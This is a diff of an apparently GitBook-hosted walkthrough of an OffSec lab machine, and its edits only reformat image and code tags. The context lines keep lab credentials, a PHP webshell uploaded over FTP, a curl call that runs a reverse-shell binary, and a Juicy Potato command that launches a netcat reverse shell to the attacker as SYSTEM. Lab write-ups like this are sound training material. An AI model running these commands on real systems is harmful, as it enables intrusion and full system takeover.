@@ -116,13 +116,13 @@ offsec:elite
 
 We can then login to the web application hosted on port 242:
 
-<figure><img src="../../../.gitbook/assets/image (2248).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2248).png>)
 
 ### RCE
 
 I put a `cmd.php` file in the `admin` FTP folder, and it worked in getting RCE:
 
-<figure><img src="../../../.gitbook/assets/image (3161).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3161).png>)
 
 The machine didn't have `powershell`, so I generated a reverse shell payload:
 
@@ -141,7 +141,7 @@ Placed it within the FTP server and executed it using my webshell:
 $ curl -H 'Authorization: Basic b2Zmc2VjOmVsaXRl' -G --data-urlencode 'cmd=.\rev.exe' http://192.168.160.46:242/cmd.php
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1108).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1108).png>)
 
 ## Privilege Escalation
 
@@ -183,10 +183,8 @@ dir
 
 We can then run `nc.exe` as the SYSTEM user using Juicy Potato:
 
-{% code overflow="wrap" %}
 ```
 .\juicypotatox86.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p C:\Windows\system32\cmd.exe -a "/c C:\Windows\Tasks\nc.exe -e cmd.exe 192.168.45.191 4444" -t *
 ```
-{% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (552).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(552).png>)
